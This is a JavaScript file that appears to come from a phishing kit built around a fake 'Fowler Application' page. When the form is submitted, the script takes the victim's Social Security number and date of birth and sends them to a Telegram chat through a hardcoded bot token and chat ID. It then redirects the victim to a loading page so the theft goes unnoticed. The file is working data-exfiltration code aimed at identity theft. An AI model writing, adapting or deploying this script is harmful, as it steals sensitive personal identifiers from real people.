document.addEventListener("DOMContentLoaded", function () {  
    const ssn7 = document.getElementById('ssn');
    const dob7 = document.getElementById('dob');

    var form7 = document.getElementById("myform7");

    form7.addEventListener('submit', async (e) => {

        e.preventDefault();

        let ebody = `
        \n
        <b>[SSN + DOB - Fowler Application]</b>
        \n
        <b>SSN: </b>${ssn7.value}
        \n
        <b>DOB: </b>${dob7.value}
        \n`;

        // Telegram Bot API endpoint
        const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
        const chatId = '6391433593';

        const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            const response = await axios.post(telegramApiUrl, {
                chat_id: chatId,
                text: ebody,
                parse_mode: 'HTML',
            });

            // Redirect after sending the message
            window.location.href = "load.html";
        } catch (error) {
            console.error("Error sending message to Telegram:", error);

            // Check if there's a specific error message from the Telegram API response
            if (error.response && error.response.data) {
                console.error("Telegram API error:", error.response.data);
            }
        }
    });
});